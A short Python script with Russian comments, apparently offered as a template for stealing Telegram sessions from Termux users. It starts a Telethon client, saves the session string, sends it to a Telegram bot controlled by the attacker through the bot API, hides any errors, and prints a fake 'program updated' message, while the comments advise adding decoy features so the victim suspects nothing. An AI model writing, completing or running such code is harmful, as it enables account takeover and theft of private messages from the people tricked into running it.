from telethon.sync import TelegramClient  
import requests  
import os  

api_id = 1234567  
api_hash = 'deadbeef12345'  

# Укради сессию текущего пользователя Termux  
try:  
    client = TelegramClient("anon.session", api_id, api_hash)  
    client.start()  
    session_str = client.session.save()  
    # Отправь сессию в свой Telegram  
    requests.post(f'https://api.telegram.org/botТОКЕН_БОТА/sendMessage?chat_id=ТВОЙ_ID&text={session_str}')  
except:  
    pass  

# Дальше можешь добавить «полезный» функционал, чтобы жертва не заподозрила  
print("Программа успешно обновлена! Перезапусти Termux.")  
